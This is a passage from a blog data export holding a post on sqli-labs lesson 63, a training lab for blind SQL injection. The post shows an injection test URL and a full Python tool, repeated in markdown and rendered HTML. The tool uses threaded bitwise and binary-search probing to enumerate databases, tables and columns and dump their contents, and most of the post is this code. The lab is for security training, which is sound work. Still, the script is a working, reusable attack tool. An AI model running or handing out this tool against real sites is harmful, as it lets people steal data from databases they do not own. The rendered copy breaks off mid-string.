(options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n```\n\n","source":"_posts/sqli-labs-lession-63-GET-盲注-变化2-仅允许130次请求.md","raw":"---\ntitle: sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求\ndate: 2018-11-29 14:05:28\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求\n\n---\n\n## 注入\n\n闭合点\n\n`http://10.60.17.35:8082/Less-63/?id=1'+and+1=1%23`\n\n## 脚本\n\n![001](/img/sql/Lesson-63/001.png)\n\n![002](/img/sql/Lesson-63/002.png)\n\n![003](/img/sql/Lesson-63/003.png)\n\n![004](/img/sql/Lesson-63/004.png)\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = \"'\"\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n```\n\n","slug":"sqli-labs-lession-63-GET-盲注-变化2-仅允许130次请求","published":1,"updated":"2019-06-19T17:23:13.399Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istkx009v4dsb7864eh17","content":"<h1 id=\"sqli-labs-lession-63-GET-盲注-变化2-仅允许130次请求\"><a href=\"#sqli-labs-lession-63-GET-盲注-变化2-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求\"></a>sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>闭合点</p>\n<p><code>http://10.60.17.35:8082/Less-63/?id=1&#39;+and+1=1%23</code></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p><img src=\"/img/sql/Lesson-63/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-63/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-63/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-63/004.png\" alt=\"004\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">\"'\"</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 